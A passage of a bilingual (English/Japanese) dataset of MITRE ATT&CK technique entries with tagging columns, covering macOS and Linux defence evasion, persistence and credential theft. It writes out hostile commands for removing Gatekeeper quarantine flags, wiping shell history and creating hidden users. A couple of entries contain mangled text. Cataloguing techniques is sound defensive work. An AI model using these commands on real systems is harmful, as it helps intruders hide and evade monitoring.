macOSにおけるアプリケーションの実行設定はプロパティリスト(plist)ファイルに記述される。このファイル内の<code>apple.awt.UIElement</code>タグを使用すると、JavaアプリケーションがDockにアイコンを表示しないように設定できる。 この機能は、アプリケーションがシステムトレイで実行されるが、Dockには表示されたくない場合に一般的に使用されます。しかし、攻撃者はこの機能を悪用して、実行中のウィンドウを隠すことができます。(引用: Antiquated Mac Malware),defense-evasion,macOS;Windows,script_command_execution,stealth,privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--04ee0cb7-dac3-4c6c-9387-4c6aa096f4cf,2017-12-14T16:46:06.044Z,2025-04-25T15:15:05.608Z,,,,
T1144,,Gatekeeper Bypass,Gatekeeper バイパス,"In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called <code>com.apple.quarantine</code>. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, other utilities or events like drive-by downloads don’t necessarily set it either. This completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware Persistence) The presence of the quarantine flag can be checked by the xattr command <code>xattr /path/to/MyApp.app</code> for <code>com.apple.quarantine</code>. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, <code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>. (Citation: Clearing quarantine attribute) (Citation: OceanLotus for OS X) In typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)",macOSおよびOS Xでは、インターネットからアプリケーションやプログラムをダウンロードすると、ファイルに<code>com.apple.quarantine</code>という特別な属性が設定されます。この属性は実行時にAppleのGatekeeper防御プログラムによって読み取られ、ユーザーに実行の許可または拒否を求めるプロンプトが表示されます。 USBフラッシュドライブ、光学ディスク、外付けハードドライブ、あるいはローカルネットワーク経由で共有されたドライブからシステムにロードされたアプリはこのフラグを設定しません。さらに、ドライブバイダウンロードなどの他のユーティリティやイベントも必ずしもこれを設定しません。これにより、組み込みのGatekeeperチェックが完全にバイパスされます。 (引用: Methods of Mac Malware Persistence) 検疫フラグの存在は、xattr コマンド <code>xattr /path/to/MyApp.app</code> で <code>com.apple.quarantine</code> を確認できます。 同様に、sudoアクセス権または昇格された権限があれば、この属性はxattrで削除することも可能です。<code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>。 (引用: 検疫属性のクリア) (引用: OceanLotus for OS X) 通常、ファイルはインターネットからダウンロードされ、ディスクに保存される前に検疫フラグが設定されます。ユーザーがファイルやアプリケーションを開こうとすると、macOSのゲートキーパーがこのフラグの存在を確認します。 フラグが存在する場合、macOS はプログラムの実行確認をユーザーに求め、アプリケーションの取得元 URL まで表示します。ただし、これはすべて、検疫対応アプリケーションからファイルがダウンロードされた場合に限られます。(引用: ゲートキーパーの回避),defense-evasion,macOS,script_command_execution,stealth,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--6fb6408c-0db3-41d9-a3a1-a32e5f16454e,2017-12-14T16:46:06.044Z,2025-04-25T15:15:42.510Z,,,,
T1145,,Private Keys,秘密鍵,"Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto) Adversaries may gather private keys from compromised systems for use in authenticating to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:\Users\(username)\.ssh\</code> on Windows. Private keys should require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia)",秘密鍵と証明書は、認証、暗号化/復号化、デジタル署名に使用されます。（出典: Wikipedia Public Key Crypto）攻撃者は、侵害されたシステムから秘密鍵を収集し、SSHなどの[リモートサービス](https://attack.mitre.org/techniques/T1021)への認証に使用したり、電子メールなどの収集済みファイルの復号化に使用したりする可能性があります。 一般的な鍵および証明書ファイルの拡張子には、.key、.pgp、.gpg、.ppk、.p12、.pem、.pfx、.cer、.p7b、.asc などがあります。 攻撃者は、*nix ベースのシステムでは SSH キー用の <code>~/.ssh</code>、Windows では <code>C:\Users\(username)\.ssh\</code> などの一般的なキーディレクトリも調べる可能性があります。 秘密鍵は操作にパスワードまたはパスフレーズを必要とするため、攻撃者はキーロギングのために[入力キャプチャ](https://attack.mitre.org/techniques/T1056)を使用したり、オフラインでパスフレーズを[ブルートフォース攻撃](https://attack.mitre.org/techniques/T1110)で解読しようとする可能性があります。 侵害されたシステム内で暗号鍵や証明書に関連するファイル拡張子を検索する攻撃者ツールが確認されている。(引用元: Kaspersky Careto) (引用元: Palo Alto Prince of Persia),credential-access,Linux;macOS;Windows,credential_abuse,credential_gain,authentication_system;user_interaction;network_connectivity;email_infrastructure;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Mail / Collaboration;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--56ff457d-5e39-492b-974c-dfd2b8603ffe,2017-12-14T16:46:06.044Z,2025-04-25T15:15:34.784Z,,,,
T1146,,Clear Command History,コマンド履歴の消去,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. macOS and Linux both keep track of the commands users type in their terminal so that users can retrace what they've done. These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Since everything typed on the command-line is saved, passwords passed in on the command line are also saved. Adversaries can abuse this by searching these files for cleartext passwords. Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as <code>unset HISTFILE</code>, <code>export HISTFILESIZE=0</code>, <code>history -c</code>, <code>rm ~/.bash_history</code>.",システムログの消去に加え、攻撃者は侵入中に実行した操作を隠蔽するため、侵害されたアカウントのコマンド履歴を消去する場合がある。macOSとLinuxはどちらも、ユーザーがターミナルで入力したコマンドを追跡し、操作の経緯を遡れるようにしている。これらのログにはいくつかの方法でアクセスできる。ログイン中は、このコマンド履歴が環境変数<code>HISTFILE</code>が指すファイルに記録される。 ユーザーがシステムからログオフすると、この情報はユーザーのホームディレクトリにある<code>~/.bash_history</code>というファイルに書き込まれます。これにより、異なるセッションで以前使用したコマンドを呼び戻すことが可能になります。コマンドラインで入力された内容はすべて保存されるため、コマンドラインで渡されたパスワードも保存されます。 攻撃者はこれらのファイルから平文パスワードを検索することで悪用可能です。さらに攻撃者は、<code>unset HISTFILE</code>、<code>export HISTFILESIZE=0</code>、<code>history -c</code>、<code>rm ~/.bash_history</code> など様々な手法を用いて、自身のコマンドがログに記録されないようにすることもできます。,defense-evasion,Linux;macOS,credential_abuse,stealth,authentication_system;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--d3046a90-580c-4004-8208-66915bc29830,2017-12-14T16:46:06.044Z,2025-04-25T15:16:12.955Z,,,,
T1147,,Hidden Users,隠しユーザー,"Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in <code>/Library/Preferences/com.apple.loginwindow</code> called <code>Hide500Users</code> that prevents users with userIDs 500 and lower from appearing at the login screen. By using the [Create Account](https://attack.mitre.org/techniques/T1136) technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: <code>sudo dscl . -create /Users/username UniqueID 401</code> (Citation: Cybereason OSX Pirrit).",macOS の各ユーザーアカウントにはユーザーIDが割り当てられています。ユーザー作成時にアカウントのユーザーIDを指定できます。<code>/Library/Preferences/com.apple.loginwindow</code> 内の <code>Hide500Users</code> プロパティ値は、ユーザーID 500 以下のユーザーをログイン画面に表示しないようにします。 ユーザーIDを500未満に設定した[アカウントの作成](https://attack.mitre.org/techniques/T1136)手法と、このプロパティを有効化（Yesに設定）することで、攻撃者は自身のユーザーアカウントをはるかに容易に非表示にできます：<code>sudo dscl . -create /Users/username UniqueID 401</code> （引用元: Cybereason OSX Pirrit）。,defense-evasion,macOS,config_policy_manipulation,stealth,authentication_system;user_interaction;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--ce73ea43-8e77-47ba-9c11-5e9c9c58b9ff,2017-12-14T16:46:06.044Z,2025-04-25T15:16:11.008Z,,,,
T1148,,HISTCONTROL,HISTCONTROL,"The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that  Els Ewill not be saved, but “ls Ewould be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",<code>HISTCONTROL</code>環境変数は、ユーザーがログアウトする際に<code>history</code>コマンドによって保存され、最終的に<code>~/.bash_history</code>ファイルに記録される内容を管理します。この設定を「ignorespace」に設定するだけで、先頭にスペースを含むコマンドを無視するように構成できます。 <code>HISTCONTROL</code> は「ignoredups」に設定することで重複コマンドも無視できます。一部の Linux システムではデフォルトで「ignoreboth」に設定されており、前述の 2 つの例を両方カバーします。つまり、 Els E は保存されませんが、「ls E」は履歴に保存されます。 macOSではデフォルトで<code>HISTCONTROL</code>は存在しませんが、ユーザーが設定可能でその設定は有効になります。攻撃者は、ターミナルコマンドの先頭にスペースを付けるだけで痕跡を残さずに操作を行うことができます。,defense-evasion,Linux;macOS,script_command_execution,stealth,user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--086952c4-5b90-4185-b573-02bad8e11953,2017-12-14T16:46:06.044Z,2025-04-25T15:15:06.346Z,,,,
T1149,,LC_MAIN Hijacking,LC_MAIN ハイジャック,"**This technique has been deprecated and should no longer be used.** As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary’s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD (Citation: Prolific OSX Malware History). The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn’t know anything was different (Citation: Methods of Mac Malware Persistence). By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.",**この手法は非推奨となり、使用すべきではありません。** OS X 10.8以降、mach-Oバイナリは実行用のエントリポイントを指定する新しいヘッダーLC_MAINを導入しました。以前は同じ効果を得るためにLC_THREADとLC_UNIXTHREADの2つのヘッダーが存在していました（出典: Prolific OSX Malware History）。 バイナリのエントリポイントはハイジャックされ、初期実行が（別のセクションまたはコードケイブといった）悪意のある追加部分に流れ、その後元のエントリポイントに戻るように仕向けられます。これにより被害者は何の変化も感知できません（出典: Methods of Mac Malware Persistence）。この方法でバイナリを改変すれば、ファイル名やアプリケーションパスが同一のままであるため、アプリケーションのホワイトリストを迂回できます。,defense-evasion,macOS,discovery_enumeration,stealth,endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--a0a189c8-d3bd-4991-bf6f-153d185ee373,2017-12-14T16:46:06.044Z,2025-04-25T15:15:56.211Z,,,,
T1150,,Plist Modification,Plistの改変,"Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). Adversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)",プロパティリスト（plist）ファイルには、macOSおよびOS Xがアプリケーションやサービスを設定するために使用する全情報が含まれます。これらのファイルはUTF-8エンコードされ、< >で囲まれた一連のキーによってXML文書のようにフォーマットされます。プログラムの実行タイミング、実行ファイルへのパス、プログラム引数、必要なOS権限など、詳細な設定が記述されています。 plistファイルは、その目的に応じて特定の場所に配置されます。例えば、<code>/Library/Preferences</code>（管理者権限で実行）や<code>~/Library/Preferences</code>（ユーザー権限で実行）などです。 攻撃者はこれらのplistファイルを改変し、自身のコードを指すようにしたり、他のユーザーのコンテキストで自身のコードを実行したり、ホワイトリスト手順をバイパスしたり、さらには永続化メカニズムとして利用したりすることが可能です。（出典: Sofacy Komplex Trojan）,defense-evasion;persistence;privilege-escalation,macOS,data_collection,privilege_gain,privileged_account;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0003;TA0004,attack-pattern--06780952-177c-4247-b978-79c357fb311f,2017-12-14T16:46:06.044Z,2025-04-18T17:59:20.413Z,,,,
T1151,,Space after Filename,ファイル名の後のスペース,"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to ""evil.txt "" (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back). Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",攻撃者はファイル拡張子を変更することでプログラムの真のファイルタイプを隠蔽できます。特定のファイルタイプ（特に.app拡張子では機能しません）では、ファイル名の末尾にスペースを追加すると、オペレーティングシステムによるファイルの処理方法が変更されます。例えば、evil.binという名前のMach-O実行可能ファイルがある場合、ユーザーがこれをダブルクリックするとTerminal.appが起動して実行されます。 このファイルをevil.txtにリネームすると、ユーザーがダブルクリックした際にデフォルトのテキスト編集アプリケーションが起動します（バイナリは実行されません）。しかし、ファイル名を「evil.txt 」とリネームした場合（末尾のスペースに注意）、ユーザーがダブルクリックするとOSが真のファイルタイプを判別し適切に処理するため、バイナリが実行されます（出典: Mac Backdoors are back）。 攻撃者はこの機能を利用し、ユーザーを騙して一見無害な形式のファイルをダブルクリックさせ、最終的に悪意のあるプログラムを実行させることが可能です。,defense-evasion;execution,Linux;macOS,other,stealth,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002,attack-pattern--e2907cea-4b43-4ed7-a570-0fdf0fbeea00,2017-12-14T16:46:06.044Z,2025-04-25T15:16:17.444Z,,,,
T1152,,Launchctl,Launchctl,"Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made (Citation: Sofacy Komplex Trojan). Running a command from launchctl is as simple as <code>launchctl submit -l <labelName> -- /Path/to/thing/to/execute ""arg"" ""arg"" ""arg""</code>. Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges. Adversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.","Launchctlは、起動エージェントや起動デーモンなどを扱うmacOSのlaunchdプロセスを制御しますが、それ自体で他のコマンドやプログラムを実行することもできます。Launchctlは、コマンドライン上、対話的に、あるいは標準入力からのリダイレクトによってサブコマンドを受け取ることをサポートしています。起動エージェントや起動デーモンをロードまたはリロードすることで、攻撃者は永続性をインストールしたり、行った変更を実行したりすることができます（出典：Sofacy Komplex Trojan）。 launchctl からコマンドを実行するのは、<code>launchctl submit -l <labelName> -- /Path/to/thing/to/execute ""arg"" ""arg"" ""arg""</code> と記述するだけで簡単です。起動エージェントや起動デーモンのロード、アンロード、再ロードには昇格された権限が必要な場合があります。 攻撃者はこの機能を悪用してコードを実行したり、launchctl が許可されたプロセスである場合にはホワイトリストをバイパスすることさえ可能です。",defense-evasion;execution;persistence,macOS,script_command_execution,stealth,privileged_account;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002;TA0003,attack-pattern--53bfc8bf-8f76-4cd7-8958-49a884ddb3ee,2017-12-14T16:46:06.044Z,2025-04-25T15:15:33.022Z,,,,
T1153,,Source,ソース,"**This technique has been deprecated and should no longer be used.** The <code>source</code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source /path/to/filename [arguments]</code> or <code>.**This technique has been deprecated and should no longer be used.** /path/to/filename [arguments]</code>. Take note of the space after the ""."". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.(Citation: Source Manual) Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.","**この手法は非推奨となり、使用すべきではありません。** <code>source</code>コマンドは、現在のシェルに機能をロードするか、現在のコンテキストでファイルを実行します。この組み込みコマンドは、<code>source /path/to/filename [arguments]</code> または <code>source /path/to/filename [arguments]</code> の2つの方法で実行できます。 ""."" の後のスペースに注意してください。スペースがない場合、現在のコンテキスト内でプログラムを実行する代わりに、プログラムを実行する新しいシェルが作成されます。これは、特定の機能や関数をシェルで使用可能にしたり、特定のシェルの環境を更新したりするためによく使用されます。(引用元: Source Manual) 攻撃者はこの機能を悪用してプログラムを実行する可能性があります。この手法で実行されるファイルは、事前に実行可能としてマークされている必要はありません。",execution,Linux;macOS,script_command_execution,foothold,endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--45d84c8b-c1e2-474d-a14d-69b5de0a2bc0,2017-12-14T16:46:06.044Z,2025-04-25T15:15:28.323Z,,,,
T1154,,Trap,トラップ,"The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where ""command list"" will be executed when ""signals"" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)",<code>trap</code>コマンドは、割り込み信号受信時に実行されるコマンドをプログラムやシェルが指定することを可能にします。一般的な使用例として、<code>ctrl+c</code>や<code>ctrl+d</code>といった一般的なキーボード割り込みを処理し、スクリプトを正常に終了させるケースが挙げられます。攻撃者は、シェルが特定の割り込みを検知した際に実行されるコードを登録することで、実行権の獲得や永続化メカニズムとして悪用する可能性があります。 トラップコマンドの形式は次の通りです：<code>trap 'コマンドリスト' シグナル</code>。ここで「コマンドリスト」は「シグナル」を受信した際に実行されます。（出典：Trapマニュアル）（出典：Cyberciti Trapステートメント）,execution;persistence,Linux;macOS,script_command_execution,foothold,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0002;TA0003,attack-pattern--b53dbcc6-147d-48bb-9df4-bcb8bb808ff6,2017-12-14T16:46:06.044Z,2025-04-25T15:16:01.491Z,,,,
T1155,,AppleScript,AppleScript,"macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the <code>osalang</code> program. AppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. Adversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python (Citation: Macro Malware Targets Macs). Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e ""script here""</code>.","macOSおよびOS Xアプリケーションは、プロセス間通信（IPC）のために相互にAppleEventメッセージを送信します。これらのメッセージは、ローカルまたはリモートのIPCのためにAppleScriptで容易にスクリプト化できます。OsascriptはAppleScriptおよびその他のOpen Scripting Architecture（OSA）言語スクリプトを実行します。システムにインストールされているOSA言語の一覧は、<code>osalang</code>プログラムを使用して確認できます。 AppleEventメッセージは単独で、またはスクリプトの一部として送信できます。これらのイベントは、開いているウィンドウの特定、キーストロークの送信、ローカルまたはリモートのほぼすべての開いているアプリケーションとの対話が可能です。攻撃者はこれを利用して、開いているSSH接続との対話、リモートマシンへの移動、さらにはユーザーに偽のダイアログボックスを表示することさえできます。これらのイベントはリモートでアプリケーションを起動することはできません（ローカルでは起動可能ですが）、リモートで既に実行されているアプリケーションとは対話できます。 スクリプト言語であるため、Python経由のリバースシェル起動など、より一般的な手法の実行にも利用可能です（出典: Macro Malware Targets Macs）。スクリプトはコマンドラインから<code>osascript /path/to/script</code>または<code>osascript -e ""script here""</code>で実行できます。",execution,macOS,remote_service_abuse,foothold,user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--5ad95aaa-49c1-4784-821d-2e83f47b079b,2017-12-14T16:46:06.044Z,2025-04-25T15:15:35.716Z,,,,
T1156,,Malicious Shell Modification,悪意のあるシェル改変,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot). For macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",攻撃者は、ユーザーのシェルによってトリガーされる悪意のあるコマンドを実行することで永続性を確立する可能性があります。ユーザーシェルは、セッション中のさまざまな時点において、イベントに基づいて複数の設定スクリプトを実行します。例えば、ユーザーがコマンドラインインターフェースを開いたり、SSHなどの方法でリモートログインしたりすると、ログインシェルが起動されます。ログインシェルは、環境を設定するためにシステム（/etc）およびユーザーのホームディレクトリ（~/）からスクリプトを実行します。 システム上のすべてのログインシェルは起動時に<code>/etc/profile</code>を使用します。これらの設定スクリプトはディレクトリの権限レベルで実行され、環境変数の設定、エイリアスの作成、ユーザー環境のカスタマイズに頻繁に使用されます。シェルが終了または終了する際には、シェルが適切に終了することを保証するために追加のシェルスクリプトが実行されます。攻撃者は、シェルによって自動的に実行されるスクリプトにコマンドを挿入することで永続性を確立しようとする可能性があります。 例として、ほとんどのGNU/Linuxシステムでデフォルトシェルであるbashでは、攻撃者は<code>/etc/profile</code>および<code>/etc/profile.d</code>ファイルに悪意のあるバイナリを起動するコマンドを追加することがあります（引用元: intezer-kaiji-malware）。これらのファイルはroot権限を必要とし、システム上のシェルが起動されるたびに実行されます。 ユーザーレベル権限では、攻撃者は<code>~/.bash_profile</code>、<code>~/.bash_login</code>、または<code>~/.profile</code>（Rocke）に悪意のあるコマンドを挿入できます。これらはユーザーがコマンドラインインターフェースを開くかリモート接続する際に読み込まれます。攻撃者は~/.bash_profileを頻繁に利用します。システムはリストされた順序で最初に存在するファイルのみを実行するためです。 攻撃者は<code>~/.bashrc</code>ファイル（Tsunami、Rocke、Linux Rabbit、Magento）も悪用します。このファイルは、リモート接続が確立された場合や、コマンドラインインターフェースの新しいタブなど追加の対話型シェルが開かれた場合に追加で実行されます。 一部のマルウェアはプログラム終了時をトリガーに実行される（Cannon）。攻撃者はセッション終了時に悪意あるコマンドを実行するため<code>~/.bash_logout</code>ファイルを利用可能（Pearl_shellbot）。 macOS では、この手法の機能は同様ですが、macOS 10.15 以降のデフォルトシェルである zsh を活用します。Terminal.app が開かれると、アプリケーションは zsh ログインシェルと zsh 対話型シェルを起動します。 ログインシェルは<code>/etc/profile</code>、<code>/etc/zshenv</code>、<code>/etc/zprofile</code>、<code>/etc/zlogin</code>を用いてシステム環境を設定します。その後、ログインシェルは<code>~/.zprofile</code>と<code>~/.zlogin</code>でユーザー環境を設定します。 対話型シェルは<code>~/.zshrc</code>を使用してユーザー環境を設定します。終了時には<code>/etc/zlogout</code>と<code>~/.zlogout</code>が実行されます。レガシープログラム向けに、macOSは起動時に<code>/etc/bashrc</code>を実行します。,persistence,Linux;macOS,credential_abuse,foothold,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8,2017-12-14T16:46:06.044Z,2025-04-15T19:58:01.754Z,,,,
T1157,,Dylib Hijacking,Dylibハイジャック,"macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence. A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X) If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.",macOSとOS Xは、プログラムにロードする必要な動的ライブラリ（dylib）を検索パスに基づいて探す共通の方法を使用します。攻撃者は曖昧なパスを利用してdylibを仕込み、権限昇格や永続化を図ることができます。一般的な手法は、アプリケーションが使用するdylibを確認し、検索パスの上位に同じ名前の悪意のあるバージョンを仕込むことです。これにより、通常dylibはアプリケーション自体と同じフォルダに配置されます。 (引用: Writing Bad Malware for OSX) (引用: Malware Persistence on OS X) プログラムが現在のユーザーよりも高い特権レベルで実行されるように設定されている場合、dylibがアプリケーションにロードされると、そのdylibも同様に昇格されたレベルで実行されます。これは攻撃者による権限昇格の手法として利用可能です。,persistence;privilege-escalation,macOS,other,privilege_gain,privileged_account;user_interaction,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--aa8bfbc9-78dc-41a4-a03b-7453e0fdccda,2017-12-14T16:46:06.044Z,2025-04-25T15:15:58.533Z,,,,
